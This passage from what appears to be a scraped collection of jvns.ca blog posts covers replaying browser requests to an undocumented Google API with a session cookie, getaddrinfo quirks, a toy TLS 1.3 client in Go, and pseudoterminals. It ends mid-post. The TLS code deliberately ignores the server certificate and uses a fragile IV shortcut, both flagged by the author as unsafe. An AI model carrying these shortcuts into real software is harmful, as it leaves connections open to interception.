'personId=101777723309&personId=1175339043204&personId=1115266537043&personId=116731406166&extensionSet.extensionNames=HANGOUTS_ADDITIONAL_DATA&extensionSet.extensionNames=HANGOUTS_OFF_NETWORK_GAIA_GET&extensionSet.extensionNames=HANGOUTS_PHONE_DATA&includedProfileStates=ADMIN_BLOCKED&includedProfileStates=DELETED&includedProfileStates=PRIVATE_PROFILE&mergedPersonSourceOptions.includeAffinity=CHAT_AUTOCOMPLETE&coreIdParams.useRealtimeNotificationExpandedAcls=true&requestMask.includeField.paths=person.email&requestMask.includeField.paths=person.gender&requestMask.includeField.paths=person.in_app_reachability&requestMask.includeField.paths=person.metadata&requestMask.includeField.paths=person.name&requestMask.includeField.paths=person.phone&requestMask.includeField.paths=person.photo&requestMask.includeField.paths=person.read_only_profile_info&requestMask.includeField.paths=person.organization&requestMask.includeField.paths=person.location&requestMask.includeField.paths=person.cover_photo&requestMask.includeContainer=PROFILE&requestMask.includeContainer=DOMAIN_PROFILE&requestMask.includeContainer=CONTACT&key=REDACTED'\n \n\n So I just need 4 headers:  Authorization ,  Content-Type ,  Origin , and  Cookie . That’s a lot more manageable. \n\n step 4: translate it into Python \n\n Now that we know what headers we need, we can translate our  curl  command into a Python program!\nThis part is also a pretty mechanical process, the goal is just to send exactly the same data with Python as we were with curl. \n\n Here’s what that looks like. This is exactly the same as the previous  curl \ncommand, but using Python’s  requests . I also broke up the very long request body\nstring into an array of tuples to make it easier to work with\nprogrammatically. \n\n import requests\nimport urllib\n\ndata = [\n    ('personId','101777723'), # I redacted these IDs a bit too\n    ('personId','117533904'),\n    ('personId','111526653'),\n    ('personId','116731406'),\n    ('extensionSet.extensionNames','HANGOUTS_ADDITIONAL_DATA'),\n    ('extensionSet.extensionNames','HANGOUTS_OFF_NETWORK_GAIA_GET'),\n    ('extensionSet.extensionNames','HANGOUTS_PHONE_DATA'),\n    ('includedProfileStates','ADMIN_BLOCKED'),\n    ('includedProfileStates','DELETED'),\n    ('includedProfileStates','PRIVATE_PROFILE'),\n    ('mergedPersonSourceOptions.includeAffinity','CHAT_AUTOCOMPLETE'),\n    ('coreIdParams.useRealtimeNotificationExpandedAcls','true'),\n    ('requestMask.includeField.paths','person.email'),\n    ('requestMask.includeField.paths','person.gender'),\n    ('requestMask.includeField.paths','person.in_app_reachability'),\n    ('requestMask.includeField.paths','person.metadata'),\n    ('requestMask.includeField.paths','person.name'),\n    ('requestMask.includeField.paths','person.phone'),\n    ('requestMask.includeField.paths','person.photo'),\n    ('requestMask.includeField.paths','person.read_only_profile_info'),\n    ('requestMask.includeField.paths','person.organization'),\n    ('requestMask.includeField.paths','person.location'),\n    ('requestMask.includeField.paths','person.cover_photo'),\n    ('requestMask.includeContainer','PROFILE'),\n    ('requestMask.includeContainer','DOMAIN_PROFILE'),\n    ('requestMask.includeContainer','CONTACT'),\n    ('key','REDACTED')\n]\nresponse = requests.post('https://people-pa.clients6.google.com/v2/people/?key=REDACTED',\n    headers={\n        'X-HTTP-Method-Override': 'GET',\n        'Authorization': 'SAPISIDHASH REDACTED',\n        'Content-Type': 'application/x-www-form-urlencoded',\n        'Origin': 'https://hangouts.google.com',\n        'Cookie': 'REDACTED',\n    },\n    data=urllib.parse.urlencode(data),\n)\n\nprint(response.text)\n \n\n I ran this program and it works – it prints out a bunch of JSON! Hooray! \n\n You’ll notice that I replaced a bunch of things with  REDACTED , that’s because\nif I included those values you could access the Google Hangouts API for my\naccount which would be no good. \n\n and we’re done! \n\n Now I can modify the Python program to do whatever I want, like passing\ndifferent parameters or parsing the output. \n\n I’m not going to do anything interesting with it because I’m not actually\ninterested in using this API at all, I just wanted to show what the process looks like. \n\n But we get back a bunch of JSON that you could definitely do something with. \n\n curlconverter looks great \n\n Someone commented that you can translate curl to Python (and a bunch of other\nlanguages!) automatically with  https://curlconverter.com/  which looks amazing\n– I’ve always done it manually.  I tried it out on this example and it seems\nto work great. \n\n figuring out how the API works is nontrivial \n\n I don’t want to undersell how difficult it can be to figure out how an unknown\nAPI works – it’s not obvious! I have no idea what a lot of the parameters to\nthis Google Hangouts API do! \n\n But a lot of the time there are some parameters that seem pretty straightforward,\nlike  requestMask.includeField.paths=person.email  probably means “include each\nperson’s email address”. So I try to focus on the parameters I  do  understand\nmore than the ones I  don’t  understand. \n\n this always works (in theory) \n\n Some of you might be wondering – can you always do this? \n\n The answer is sort of yes – browsers aren’t magic! All the information\nbrowsers send to your backend is just HTTP requests. So if I copy all of the\nHTTP headers that my browser is sending, I think there’s literally no way for\nthe backend to tell that the request  isn’t  sent by my browser and is actually\nbeing sent by a random Python program. \n\n Of course, we removed a bunch of the headers the browser sent so theoretically\nthe backend  could  tell, but usually they won’t check. \n\n There are some caveats though – for example a lot of Google services have\nbackends that communicate with the frontend in a totally inscrutable (to me)\nway, so even though in theory you could mimic what they’re doing, in practice\nit might be almost impossible. And bigger APIs that encounter more abuse\nwill have more protections. \n\n Now that we’ve seen how to use undocumented APIs like this, let’s talk about\nsome things that can go wrong. \n\n problem 1: expiring session cookies \n\n One big problem here is that I’m using my Google session cookie for\nauthentication, so this script will stop working whenever my browser session\nexpires. \n\n That means that this approach wouldn’t work for a long running program (I’d\nwant to use a real API), but if I just need to quickly grab a little bit of data as a\n1-time thing, it can work great! \n\n problem 2: abuse \n\n If I’m using a small website, there’s a chance that my little Python script\ncould take down their service because it’s doing way more requests than they’re\nable to handle. So when I’m doing this I try to be respectful and not make too\nmany requests too quickly. \n\n This is especially important because a lot of sites which don’t have official\nAPIs are smaller sites with less resources. \n\n In this example obviously this isn’t a problem – I think I made 20 requests\ntotal to the Google Hangouts backend while writing this blog post, which they\ncan definitely handle. \n\n Also if you’re using your account credentials to access the API in a excessive\nway and you cause problems, you might (very reasonably) get your account\nsuspended. \n\n I also stick to downloading data that’s either mine or that’s intended to be\npublicly accessible – I’m not searching for vulnerabilities. \n\n remember that anyone can use your undocumented APIs \n\n I think the most important thing to know about this isn’t actually how to use  other\npeople’s  undocumented APIs. It’s fun to do, but it has a lot\nof limitations and I don’t actually do it that often. \n\n It’s much more important to understand that anyone can do this to  your \nbackend API!  Everyone has developer tools and the network tab, and it’s pretty\neasy to see which parameters you’re passing to the backend and to change them. \n\n So if anyone can just change some parameters to get another user’s information,\nthat’s no good. I think most developers building publicly available APIs know\nthis, but I’m mentioning it because everyone needs to learn it for the first\ntime at some point :) \n\n"},
{"url": "https://jvns.ca/blog/2022/02/23/getaddrinfo-is-kind-of-weird/", "title": "Some things about getaddrinfo that surprised me", "content": "\n     \n\n Hello! Here are some things you may or may not have noticed about DNS: \n\n \n when you resolve a DNS name in a Python program, it checks  /etc/hosts , but when you use  dig , it doesn’t. \n switching Linux distributions can sometimes change how your DNS works, for example if you use Alpine Linux instead of Ubuntu it can cause problems. \n Mac OS has DNS caching, but Linux doesn’t necessarily unless you use  systemd-resolved  or something \n \n\n To understand all of these, we need to learn about a function called\n getaddrinfo  which is responsible for doing DNS lookups. \n\n There are a bunch of surprising-to-me things about  getaddrinfo , and once I\nlearned about them, it explained a bunch of the confusing DNS behaviour I’d\nseen in the past. \n\n where does  getaddrinfo  come from? \n\n getaddrinfo  is part of a library called  libc  which is the standard C\nlibrary. There are at least 3 versions of libc: \n\n \n glibc (GNU libc) \n musl libc \n the Mac OS version of libc (I don’t know if this has a name) \n \n\n There are definitely more (I assume FreeBSD and OpenBSD each have their own\nversion for example), but those are the 3 I know about. \n\n Each of those have their own version of  getaddrinfo . \n\n not all programs use  getaddrinfo  for DNS \n\n The first thing I found surprising is that  getaddrinfo  is very widely used\nbut not universally used. \n\n Every program has basically 2 options: \n\n \n use  getaddrinfo . I think that Python, Ruby, and Node use  getaddrinfo , as well as Go sometimes. Probably many more languages too but I did not have the time to go hunting through every language’s DNS library. \n use a custom DNS resolver function. Examples of this:\n\n \n dig. I think this is because dig needs more control over the DNS query\nthan  getaddrinfo  supports so it implements its own DNS logic. \n Go also has a pure-Go DNS resolver if you don’t want to use CGo \n There’s a Ruby gem with a  custom DNS resolver  that you can use to replace  getaddrinfo . \n getaddrinfo  doesn’t support DNS over HTTPS, so I assume that browsers\nthat use DoH are not using  getaddrinfo  for those DNS lookups \n probably lots more that I’m not aware of \n \n \n\n you’ll sometimes see  getaddrinfo  in your DNS error messages \n\n Because  getaddrinfo  is so widely used, you’ll often see it in error messages related to DNS. \n\n For example if I run this Python program which looks up nonexistent domain name: \n\n import requests\n\nrequests.get(\"http://xyxqqx.com\")\n \n\n I get this error message: \n\n Traceback (most recent call last):\n  File \"/usr/lib/python3.10/site-packages/urllib3/connection.py\", line 174, in _new_conn\n    conn = connection.create_connection(\n  File \"/usr/lib/python3.10/site-packages/urllib3/util/connection.py\", line 72, in create_connection\n    for res in socket.getaddrinfo(host, port, family, socket.SOCK_STREAM):\n  File \"/usr/lib/python3.10/socket.py\", line 955, in getaddrinfo\n    for res in _socket.getaddrinfo(host, port, family, type, proto, flags):\nsocket.gaierror: [Errno -2] Name or service not known\n \n\n I think  socket.getaddrinfo  is calling libc  getaddrinfo  somewhere under the\nhood, though I did not read all of the source code to check. \n\n Before you learn what  getaddrinfo  is, it’s not at all obvious that\n socket.gaierror: [Errno -2] Name or service not known  means “that domain\ndoesn’t exist”. It doesn’t even say the words “DNS” or “domain” in it\nanywhere! \n\n getaddrinfo  on Mac doesn’t use  /etc/resolv.conf \n\n I used to use a Mac for work, and I always felt vaguely unsettled by DNS on\nMac. I could tell that  something  was different from how it worked on my\nLinux machine, but I couldn’t figure out what it was. \n\n I still don’t totally understand this and it’s hard for me to investigate\nbecause I don’t currently have access to a Mac but here’s what I’ve gathered\nso far. \n\n On Linux systems,  getaddrinfo  decides which DNS resolver to talk to using a\nfile called  /etc/resolv.conf .  (there’s apparently some additional\ncomplexity with  /etc/nsswitch.conf  but I have never looked at\n /etc/nsswitch.conf  so I’m going to ignore it). \n\n For example, this is the contents of my  /etc/resolv.conf  right now: \n\n # Generated by NetworkManager\nnameserver 192.168.1.1\nnameserver fd13:d987:748a::1\n \n\n This means that to make DNS queries,  getaddrinfo  makes a request to\n 192.168.1.1  on port 53. That’s my router’s DNS resolver. \n\n I assumed this was  getaddrinfo  on Mac also just used  /etc/resolv.conf  but I was wrong.\nInstead,  getaddrinfo  makes a request to a program called  mDNSResponder \nwhich is a Mac thing. \n\n I don’t know much about  mDNSResponder  except that it does DNS caching and\nthat apparently you can clear the cache with  dscacheutil . This explains one\nof the mysteries at the beginning of the post – why Macs have DNS caching and\nLinux machines don’t always. \n\n musl libc  getaddrinfo  is different from glibc’s version \n\n You might think ok, Mac OS  getaddrinfo  is different, but the two versions of\n getaddrinfo  in glibc and musl libc must be mostly the same, right? \n\n But they have some pretty significant differences. The main difference I know\nabout is that musl libc does not support TCP DNS. I couldn’t find anything in\nthe documentation about it but it’s mentioned in  this tweet ) \n\n I talked a bit more about this TCP DNS thing in  ways DNS can break . \n\n Some more differences: \n\n \n the way search domains (in  /etc/resolv.conf ) are handled is slightly different ( discussed here ) \n this post mentions that  musl doesn’t support nsswitch.conf .\nI have never used nsswitch.conf and I’m not sure why it’s useful but I think\nthere are reasons I don’t know about. \n \n\n more weird things: nscd? \n\n When looking up getaddrinfo I also found this interesting  post about getaddrinfo from James Fisher  that\nstraces glibc  getaddrinfo  and discovers that apparently calls some\nprogram called  nscd  which is supposed to do DNS caching. That blog post\ndescribes nscd as “unstable” and “badly designed” and it’s not clear to me how\nwidely used it is. \n\n I don’t know anything about nscd but I checked and apparently it’s on my\ncomputer. I tried it out and this is what happened: \n\n $ nscd \nchild exited with status 4\n \n\n My impression is that people who want to do DNS caching on Linux are more\nlikely to use a DNS forwarder like  dnsmasq  or  systemd-resolved  instead of\nsomething like  nscd  – that’s what I’ve seen in the past. \n\n that’s all! \n\n When I first learned about all of this I found it really surprising that such\na widely used library function has such different behaviour on different\nplatforms. \n\n I mean, it makes sense that the people who built Mac OS would want to handle\nDNS caching in a different way than it’s handled on Linux, so it’s reasonable\nthat they implemented  getaddrinfo  differently.  And it makes sense that some\nprograms choose not to use  getaddrinfo  to make DNS queries. \n\n But it definitely makes DNS a bit more difficult to reason about. \n\n"},
{"url": "https://jvns.ca/blog/2022/03/23/a-toy-version-of-tls/", "title": "Implementing a toy version of TLS 1.3", "content": "\n     \n\n Hello! Recently I’ve been thinking about how I find it fun to learn computer\nnetworking by implementing working versions of real network protocols. \n\n And it made me wonder – I’ve implemented toy versions of\n traceroute ,  TCP  and  DNS .\nWhat about TLS? Could I implement a toy version of that to learn more about how it works? \n\n I asked on Twitter if this would be hard, got  some encouragement and pointers for where to start , so I decided to go for it. \n\n This was really fun and I learned a little more about how involved real\ncryptography is – thanks to  cryptopals , I already 100% believed that I should not invent my own\ncrypto implementations, and seeing how the crypto in TLS 1.3 works gave me even more of\nan appreciation for why I shouldn’t :) \n\n As a warning: I am really not a cryptography person, I will probably say some\nincorrect things about cryptography in this post and I absolutely do not know\nthe history of past TLS vulnerabilities that informed TLS 1.3’s design. \n\n All of that said, let’s go implement some cryptography! All of my hacky code is  on github . I decided to use Go because I heard that Go has good crypto libraries. \n\n the simplifications \n\n I only wanted to work on this for a few days at most, so I needed to make some\npretty dramatic simplifications to make it possible to get it done quickly. \n\n I decided my goal was going to be to download this blog’s homepage with TLS. So I\ndon’t need to implement a fully general TLS implementation, I just need to\nsuccessfully connect to one website. \n\n Specifically, this means that: \n\n \n I only support one cipher suite \n I don’t verify the server’s certificate at all, I just ignore it \n my parsing and message formatting can be extremely janky and fragile because I only need to be able to talk to one specific TLS implementation (and believe me, they are) \n \n\n an amazing TLS resource: tls13.ulfheim.net \n\n Luckily, before starting this I remembered vaguely that I’d seen a website that\nexplained every single byte in a TLS 1.3 connection, with detailed code examples to\nreproduce every part. Some googling revealed that it was  The New Illustrated TLS Connection . \n\n I can’t stress enough how helpful this was, I looked at probably more than a\nhundred times and I only looked at the TLS 1.3 RFC for a few small things. \n\n some cryptography basics \n\n Before I started working on this, my understanding of TLS was: \n\n \n at the beginning there’s some sort of Diffie-Hellman key exchange \n you use the key exchange to somehow (how???) get an AES symmetric key and encrypt the rest of the connection with AES \n \n\n This was sort of right, but it turns out it’s more complicated than that. \n\n Okay, let’s get into my hacky toy TLS implementation. It hopefully goes without saying that you should absolutely not use this code for anything. \n\n step 1: say hello \n\n First we need to send a “Client Hello” message. For my purposes this has just 4 pieces of information in it: \n\n \n A randomly generated public key \n 32 bytes of random data (the “Client Random”) \n The domain name I want to connect to ( jvns.ca ) \n The cipher suites/signature algorithms we want to use (which I just copied\nfrom tls.ulfheim.net). This negotiation process is pretty important in\ngeneral but I’m ignoring it because I only support one signature algorithm /\ncipher suite. \n \n\n The most interesting part of this to me was part 1 – how do I generate the public key? \n\n I was confused about this for a while but it ended up being just 2 lines of code. \n\n privateKey := random(32)\npublicKey, err := curve25519.X25519(privateKey, curve25519.Basepoint)\n \n\n You can see the rest of the code to generate the  client hello message here \nbut it’s very boring, it’s just a lot of bit fiddling. \n\n elliptic curve cryptography is cool \n\n I am not going to give an explanation of elliptic curve cryptography here,  but I just want to say how point out how cool it is that you can: \n\n \n generate a random 32-byte string as a private key \n “multiply” the private key by the curve’s base point to get the public key (this is elliptic curve “multiplication”, where  n * P  means “add P to itself n times”) \n that’s it!! \n \n\n I wrote “multiply” in scare quotes because this “multiplication” doesn’t let you\nmultiply points on the elliptic curve by  each other . You can only multiply a\npoint by an integer. \n\n Here’s the function signature  of the  X25519  function we use to do the\n“multiplication”. You can see one of the arguments is called  scalar  and one\nis called  point . And the order of the arguments matters! If you switch them it\nwon’t do the right thing. \n\n func X25519(scalar, point []byte) ([]byte, error)\n \n\n I am not going to say more about elliptic curve cryptography here but I love how\nsimple this is to use – it seems a lot straightforward than RSA where your\nprivate keys have to be prime numbers. \n\n I don’t know if “you can use any 32-byte string as a private key” is true\nfor all elliptic curves or just for this specific elliptic curve ( Curve25519 ). \n\n step 2: parse the server hello \n\n Next the server says hello. This is very boring, basically we just need to\nparse it to get the server’s public key which is 32 bytes.  Here’s the code though . \n\n step 3: calculate the keys to encrypt the handshake \n\n Now that we have the server’s public key and we’ve sent the server our public\nkey, we can start to calculate the keys we’re going to use to actually encrypt\ndata. \n\n I was surprised to learn that there are at least 4 different symmetric keys involved in TLS: \n\n \n client handshake key/iv (for the data the client sends in the handshake) \n server handshake key/iv (for the data the server sends in the handshake) \n client application key/iv (for the rest of the data the client sends) \n server application key/iv (for the rest of the data the server sends) \n I think also another key for session resumption, but I didn’t implement that \n \n\n We start out by combining the server’s public key and our private key to get a\nshared secret. This is called “elliptic curve diffie hellman” or ECDH and it’s\npretty simple: “multiply” the server’s private key by our public key: \n\n sharedSecret, err := curve25519.X25519(session.Keys.Private, session.ServerHello.PublicKey)\n \n\n This gives us a 32-byte secret key that both the client and the server has. Yay! \n\n But we need 96 bytes (16 + 12) * 4 of keys in total. That’s more than 32 bytes! \n\n time for key derivation \n\n Apparently the way you turn a small key into more keys is called “key\nderivation”, and TLS 1.3 uses an algorithm called “HKDF” to do this. I honestly do not\nunderstand this but here is what my code to do it looks like. \n\n It seems to involve alternately calling  hkdf.Expand  and  hkdf.Extract  over and\nover again a bunch of times. \n\n func (session *Session) MakeHandshakeKeys() {\n\tzeros := make([]byte, 32)\n\tpsk := make([]byte, 32)\n\t// ok so far\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tearlySecret := hkdf.Extract(sha256.New, psk, zeros) // TODO: psk might be wrong\n\tderivedSecret := deriveSecret(earlySecret, \"derived\", []byte{})\n\tsession.Keys.HandshakeSecret = hkdf.Extract(sha256.New, sharedSecret, derivedSecret)\n\thandshakeMessages := concatenate(session.Messages.ClientHello.Contents(), session.Messages.ServerHello.Contents())\n\n\tcHsSecret := deriveSecret(session.Keys.HandshakeSecret, \"c hs traffic\", handshakeMessages)\n\tsession.Keys.ClientHandshakeSecret = cHsSecret\n\tsession.Keys.ClientHandshakeKey = hkdfExpandLabel(cHsSecret, \"key\", []byte{}, 16)\n\tsession.Keys.ClientHandshakeIV = hkdfExpandLabel(cHsSecret, \"iv\", []byte{}, 12)\n\n\tsHsSecret := deriveSecret(session.Keys.HandshakeSecret, \"s hs traffic\", handshakeMessages)\n\tsession.Keys.ServerHandshakeKey = hkdfExpandLabel(sHsSecret, \"key\", []byte{}, 16)\n\tsession.Keys.ServerHandshakeIV = hkdfExpandLabel(sHsSecret, \"iv\", []byte{}, 12)\n}\n \n\n This was pretty annoying to get working because I kept passing the wrong\narguments to things. The only reason I managed it was because\n https://tls13.ulfheim.net  provided a bunch of example inputs and outputs and\nexample code so I was able to write some unit tests and check my code against\nthe site’s example implementation. \n\n Anyway, eventually I got all my keys calculated and it was time to start decrypting! \n\n an aside on IVs \n\n For each key there’s also an “IV” which stands for “initialization vector”. The\nidea seems to be to use a different initialization vector for every message we\nencrypt/decrypt, for More Security ™. \n\n In this implementation the way we get a different IV for each message is by\nxoring the IV with the number of messages sent/received so far. \n\n step 4: write some decryption code \n\n Now that we have all these keys and IVs, we can write a  decrypt  function. \n\n I thought that TLS just used AES, but apparently it uses something called\n“authentication encryption” on top of AES that I hadn’t heard of before. \n\n The wikipedia article explanation of authenticated encryption is actually pretty clear: \n\n \n … authenticated encryption can provide security against  chosen ciphertext  attack. In these attacks, an adversary attempts to gain an advantage against a cryptosystem (e.g., information about the secret decryption key) by submitting carefully chosen ciphertexts to some “decryption oracle” and analyzing the decrypted results. Authenticated encryption schemes can recognize improperly-constructed ciphertexts and refuse to decrypt them. This, in turn, prevents the attacker from requesting the decryption of any ciphertext unless it was generated correctly using the encryption algorithm \n \n\n This makes sense to me because I did some of the cryptopals challenges and there’s an attack a bit like this in  cryptopals set 2  (I don’t know if it’s the exact same thing). \n\n Anyway, here’s some code that uses authenticated encryption the way the TLS 1.3\nspec says it should. I think GCM is an authenticated encryption algorithm. \n\n func decrypt(key, iv, wrapper []byte) []byte {\n\n\tblock, err := aes.NewCipher(key)\n\tif err != nil {\n\t\tpanic(err.Error())\n\t}\n\n\taesgcm, err := cipher.NewGCM(block)\n\tif err != nil {\n\t\tpanic(err.Error())\n\t}\n\n\tadditional := wrapper[:5]\n\tciphertext := wrapper[5:]\n\n\tplaintext, err := aesgcm.Open(nil, iv, ciphertext, additional)\n\tif err != nil {\n\t\tpanic(err.Error())\n\t}\n\treturn plaintext\n}\n \n\n step 5: decrypt the server handshake \n\n Next the server sends some more handshake data. This contains the certificate\nand some other stuff. \n\n Here’s my code for decrypting the handshake. Basically it just reads the\nencrypted data from the network, decrypts it, and saves it. \n\n record := readRecord(session.Conn)\nif record.Type() != 0x17 {\n    panic(\"expected wrapper\")\n}\nsession.Messages.ServerHandshake = decrypt(session.Keys.ServerHandshakeKey, session.Keys.ServerHandshakeIV, record)\n \n\n You might notice that we don’t actually  parse  this data at all – that’s\nbecause we don’t need the contents, since we’re not verifying the server’s\ncertificate. \n\n I was surprised that you don’t technically need to look at the server’s\ncertificate at all to make a TLS connection (though obviously you should verify it!). I thought you would need to at least parse it to get a\nkey out of it or something. \n\n We do need to be able to hash the handshake for the next step though, so we\nhave to store it. \n\n step 6: derive more keys \n\n We use a hash of the SHA256 handshake data we just got from the server to\ngenerate even more symmetric keys. This is almost the last step! \n\n This is almost exactly the same as the key derivation code from before, but I’m\nincluding it because I was surprised by how much work needed to be done to generate all these keys. \n\n func (session *Session) MakeApplicationKeys() {\n    handshakeMessages := concatenate(\n        session.Messages.ClientHello.Contents(),\n        session.Messages.ServerHello.Contents(),\n        session.Messages.ServerHandshake.Contents())\n\n    zeros := make([]byte, 32)\n    derivedSecret := deriveSecret(session.Keys.HandshakeSecret, \"derived\", []byte{})\n    masterSecret := hkdf.Extract(sha256.New, zeros, derivedSecret)\n\n    cApSecret := deriveSecret(masterSecret, \"c ap traffic\", handshakeMessages)\n    session.Keys.ClientApplicationKey = hkdfExpandLabel(cApSecret, \"key\", []byte{}, 16)\n    session.Keys.ClientApplicationIV = hkdfExpandLabel(cApSecret, \"iv\", []byte{}, 12)\n\n    sApSecret := deriveSecret(masterSecret, \"s ap traffic\", handshakeMessages)\n    session.Keys.ServerApplicationKey = hkdfExpandLabel(sApSecret, \"key\", []byte{}, 16)\n    session.Keys.ServerApplicationIV = hkdfExpandLabel(sApSecret, \"iv\", []byte{}, 12)\n}\n \n\n step 7: finish the handshake \n\n Next we need to send a “handshake finished” message to the server to verify that everything is done. That code is  here . \n\n And now we’re done the handshake! That was the hard part, sending and receiving\nthe data is relatively easy. \n\n step 8: make a HTTP request \n\n I wrote a  SendData  function that encrypts and sends data using our keys. This time we’re using the “application” keys and not the handshake keys. This made making a HTTP request pretty simple: \n\n req := fmt.Sprintf(\"GET / HTTP/1.1\\r\\nHost: %s\\r\\n\\r\\n\", domain)\nsession.SendData([]byte(req))\n \n\n step 9: we can actually decrypt the response!!! \n\n Now comes the moment I’d been waiting for — actually decrypting the response\nfrom the server!!! But here I needed to learn something else about TLS. \n\n TLS data comes in blocks \n\n I previously thought that once you established the connection, encrypted TLS\ndata was just a stream. But that’s not how it works – instead, it’s\ntransmitted in blocks. Like, you’ll get a chunk of ~1400 bytes to decrypt, and\nthen another chunk, and then another chunk. \n\n I’m not sure why the blocks have the size they do (maybe it’s so that each one will fit inside a TCP\npacket ???), but in theory I think they could be up to 65535 bytes, since their\nsize field is 2 bytes. The blocks I got were all 1386 bytes each. \n\n Every time we get a block, we have to: \n\n \n calculate a new IV as  old_iv xor num_records_received \n decrypt it using the key and the new IV \n increment the count of records received \n \n\n Here’s what the  ReceiveData()  function I wrote looks like. \n\n The most interesting part of this is the  iv[11] ^= session.RecordsReceived  –\nthat’s the part that adjusts the IV for each block. \n\n func (session *Session) ReceiveData() []byte {\n\trecord := readRecord(session.Conn)\n\tiv := make([]byte, 12)\n\tcopy(iv, session.Keys.ServerApplicationIV)\n\tiv[11] ^= session.RecordsReceived\n\tplaintext := decrypt(session.Keys.ServerApplicationKey, iv, record)\n\tsession.RecordsReceived += 1\n\treturn plaintext\n}\n \n\n This  iv[11]  thing assumes that there are less than 255 blocks which obviously\nis not true in general in TLS, but I was lazy and to download my blog’s\nhomepage I only needed 82 blocks. \n\n We actually have to do this when we send data too, but I didn’t implement it\nbecause we only sent 1 packet. \n\n problem: getting the whole block of tLS data \n\n I ran into one problem with TCP where sometimes I’d try to read a block of TLS\ndata (~1386 bytes), but I wouldn’t get the whole thing. I guess the TLS blocks\ncan be split up across multiple TCP packets. \n\n I fixed this in a really dumb way, by just polling the TCP connection in a loop\nuntil it gave me the data I wanted. Here’s my code to do that: \n\n func read(length int, reader io.Reader) []byte {\n\tvar buf []byte\n\tfor len(buf) != length {\n\t\tbuf = append(buf, readUpto(length-len(buf), reader)...)\n\t}\n\treturn buf\n}\n \n\n I assume a real TLS implementation would use a thread pool or coroutines or\nsomething to manage this. \n\n step 10: knowing when we’re done \n\n When the HTTP response is done, we get these bytes:  []byte{48, 13, 10, 13, 10, 23} .\nThis seems to be because my HTTP server is using chunked transfer encoding, so\nthere’s no  Content-Length  header and I need to watch for those bytes at the\nend instead. \n\n So here’s the code to receive the HTTP response. Basically we just loop until\nwe see those bytes, then we stop. \n\n func (session *Session) ReceiveHTTPResponse() []byte {\n\tvar response []byte\n\tfor {\n\t\tpt := session.ReceiveData()\n\t\tif string(pt) == string([]byte{48, 13, 10, 13, 10, 23}) {\n\t\t\tbreak\n\t\t}\n\t\tresponse = append(response, pt...)\n\t}\n\treturn response\n}\n \n\n that’s it! \n\n Finally, I ran the program and I downloaded my blog’s homepage! It worked! Here’s what the results look like: \n\n $ go build; ./tiny-tls\nHTTP/1.1 200 OK\nDate: Wed, 23 Mar 2022 19:37:47 GMT\nContent-Type: text/html\nTransfer-Encoding: chunked\nConnection: keep-alive\n... lots more headers and HTML follow...\n \n\n Okay, the results are kind of anticlimactic, it’s just the same as what you’d\nsee if you ran  curl -i https://jvns.ca  except with no formatting. But I was\nextremely excited when I saw it. \n\n unit tests are great \n\n Every time I write networking code like this, I forget that unit testing is\ngood, and I thrash around with a bunch of parsing / formatting code that does\nnot work and just getting NOPE messages back from the server on the other end. \n\n And then I remember unit tests. In this case, I copied a bunch of the data from\nthe  https://tls13.ulfheim.net  example and put it into my unit tests so that I\ncould quickly make sure that my parsing and crypto were working correctly.\nIt made everything about 10 times easier and faster. \n\n some things I learned \n\n This was really fun! I learned that \n\n \n elliptic curve diffie-hellman is very cool, and at least with Curve25519 you can use literally any 32-byte string as a private key \n there are a LOT of different symmetric keys involved in TLS and the key derivation process is pretty complicated \n TLS uses AES with some extra “authenticated encryption” algorithms on top \n TLS data is sent/received as a bunch of blocks, not as a stream \n \n\n My code truly is terrible, it can connect to my site ( jvns.ca ) and I think literally no other sites. \n\n I won’t pretend to understand all the reasons TLS is designed this way, but it\nwas a fun way to spend a couple of days, I feel a little more informed, and I\nthink it’ll be easier for me to understand things I read about TLS in the\nfuture. \n\n a plug for cryptopals \n\n If you want to learn about cryptography and you haven’t tried the\n cryptopals  challenges, I really recommend them – you\nget to implement a lot of attacks on crypto systems and it’s very fun. \n\n"},
{"url": "https://jvns.ca/blog/2022/07/20/pseudoterminals/", "title": "What happens when you press a key in your terminal?", "content": "\n     \n\n I’ve been confused about what’s going on with terminals for a long time. \n\n But this past week I was using  xterm.js  to display an\ninteractive terminal in a browser and I finally thought to ask a pretty basic\nquestion: when you press a key on your keyboard in a terminal (like  Delete , or  Escape , or  a ), which\nbytes get sent? \n\n As usual we’ll answer that question by doing some experiments and seeing what happens :) \n\n remote terminals are very old technology \n\n First, I want to say that displaying a terminal in the browser with  xterm.js \nmight seem like a New Thing, but it’s really not. In the 70s, computers were\nexpensive. So many employees at an institution would share a single computer,\nand each person could have their own “terminal” to that computer. \n\n For example, here’s a photo of a VT100 terminal from the 70s or 80s. This looks like\nit could be a computer (it’s kind of big!), but it’s not – it just displays\nwhatever information the actual computer sends it. \n\n \n\n Of course, in the 70s they didn’t use websockets for this, but the information\nbeing sent back and forth is more or less the same as it was then. \n\n \n(the terminal in that photo is from the  Living Computer Museum  in Seattle which I got to visit once and write FizzBuzz in  ed  on a very old Unix system, so it’s possible that I’ve actually used that machine or one of its siblings! I really hope the Living Computer Museum opens again, it’s very cool to get to play with old computers.)\n \n\n what information gets sent? \n\n It’s obvious that if you want to connect to a remote computer (with  ssh  or\nusing  xterm.js  and a websocket, or anything else), then some information\nneeds to be sent between the client and the server. \n\n Specifically: \n\n \n the  client  needs to send the keystrokes that the user typed in (like  ls -l ) \n the  server  needs to tell the client what to display on the screen \n \n\n Let’s look at a real program that’s running a remote terminal in a browser and see what information gets sent back and forth! \n\n we’ll use  goterm  to experiment \n\n I found this tiny program on GitHub called\n goterm  that runs a Go server that lets you\ninteract with a terminal in the browser using  xterm.js . This program is very insecure but it’s simple and great for learning. \n\n I  forked it  to make it work with the latest xterm.js,\nsince it was last updated 6 years ago. Then I added some logging statements to\nprint out every time bytes are sent/received over the websocket. \n\n Let’s look at sent and received during a few different terminal interactions! \n\n example:  ls \n\n First, let’s run  ls . Here’s what I see on the  xterm.js  terminal: \n\n bork@kiwi:/play$ ls\nfile\nbork@kiwi:/play$\n \n\n and here’s what gets sent and received: (in my code, I log  sent: [bytes]  every time the client sends bytes and  recv: [bytes]  every time it receives bytes from the server) \n\n sent: \"l\"\nrecv: \"l\"\nsent: \"s\"\nrecv: \"s\"\nsent: \"\\r\"\nrecv: \"\\r\\n\\x1b[?2004l\\r\"\nrecv: \"file\\r\\n\"\nrecv: \"\\x1b[?2004hbork@kiwi:/play$ \"\n \n\n I noticed 3 things in this output: \n\n \n Echoing: The client sends  l  and then immediately receives an  l  sent\nback. I guess the idea here is that the client is really dumb – it doesn’t\nknow that when I type an  l , I want an  l  to be echoed back to the screen.\nIt has to be told 